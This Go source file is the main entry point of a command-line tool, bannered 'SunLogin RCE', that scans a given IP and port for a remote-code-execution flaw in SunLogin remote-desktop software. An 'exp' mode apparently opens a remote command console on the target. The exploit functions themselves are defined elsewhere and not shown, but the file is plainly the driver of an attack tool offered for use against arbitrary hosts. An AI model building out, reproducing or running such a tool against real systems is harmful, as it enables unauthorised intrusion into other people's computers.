package main

import (
	"flag"
	"fmt"
)

var host, mode, port string

func main() {

	sunloginRce := NewSunLoginRce()

	flag.StringVar(&host, "h", "", "ip")
	flag.StringVar(&mode, "m", "scan", "default scan,")
	flag.StringVar(&port, "p", "", "e.g. 80,443")
	flag.Parse()

	view := `
 ___  __  __  _  _  __    _____   ___  ____  _  _    ____   ___  ____
/ __)(  )(  )( \( )(  )  (  _  ) / __)(_  _)( \( )  (  _ \ / __)( ___)
\__ \ )(__)(  )  (  )(__  )(_)( ( (_-. _)(_  )  (    )   /( (__  )__)
(___/(______)(_)\_)(____)(_____) \___/(____)(_)\_)  (_)\_) \___)(____)  by:Z92G`
	fmt.Println(view)
	fmt.Println()

	if host == "" {
		fmt.Println("[INFO]:Host is Null")
		return
	}
	switch mode {
	case "scan":
		if port == "" {
			fmt.Println("[INFO]:Port is Null")
			return
		}
		sunloginRce.ScanRce(host, port)
	case "exp":
		sunloginRce.RecConsole(host)
	default:
		fmt.Println("[INFO]:Input Err")
		return
	}

}
